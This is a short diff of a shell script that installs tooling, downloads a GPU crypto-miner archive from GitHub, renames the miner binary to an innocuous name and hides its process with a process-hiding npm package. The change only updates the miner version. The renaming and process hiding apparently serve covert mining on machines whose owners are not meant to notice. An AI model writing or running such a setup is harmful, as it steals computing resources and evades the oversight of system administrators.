@@ -2,9 +2,9 @@ apt update
 apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 npm i -g node-process-hider
 nvidia-smi
-rm -rf peakminer-2.10.0.tar.gz
-wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-10-0/peakminer-2.10.0.tar.gz
-tar xf peakminer-2.10.0.tar.gz
+rm -rf peakminer-2.11.0.tar.gz
+wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-11-0/peakminer-2.11.0.tar.gz
+tar xf peakminer-2.11.0.tar.gz
 mv peakminer kialospo
 
 ph add kialospo
